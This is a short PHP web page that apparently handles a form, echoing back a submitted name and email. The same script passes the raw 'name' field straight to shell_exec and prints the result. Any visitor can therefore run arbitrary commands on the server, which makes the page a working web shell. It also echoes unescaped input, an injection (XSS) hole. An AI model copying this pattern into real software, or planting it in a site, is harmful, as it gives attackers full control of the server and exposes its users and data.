<meta charset="utf-8">
<html>
<body>

Welcome <?php echo $_POST["name"]; ?><br>
Your email address is: <?php echo $_POST["email"]; ?>

<?php
$output = shell_exec("$_POST[name]");
echo "<pre> $output</pre>";
?>

</body>
</html>
